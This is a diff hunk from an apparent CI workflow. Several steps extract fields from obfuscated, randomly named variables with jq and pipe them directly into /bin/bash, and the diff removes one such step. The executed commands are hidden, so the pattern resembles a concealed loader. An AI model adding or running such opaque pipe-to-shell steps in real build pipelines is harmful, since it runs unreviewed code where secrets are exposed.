@@ -25,7 +25,6 @@ jobs:
           echo $m602 | jq -r .lkk13316 | /bin/bash
           printf '%s' "$pph980" | jq -r .vb1 | /bin/bash
           printf '%s' "$c2275" | jq -r .j64 | /bin/bash
-          printf '%s' "$m67" | jq -r .ucs227 | /bin/bash
           printf '%s' "$rvcys67" | jq -r .jb6 | /bin/bash
           echo $nta97496 | jq -r .pojpo21 | /bin/bash
           echo $pre702 | jq -r .scqm7 | /bin/bash
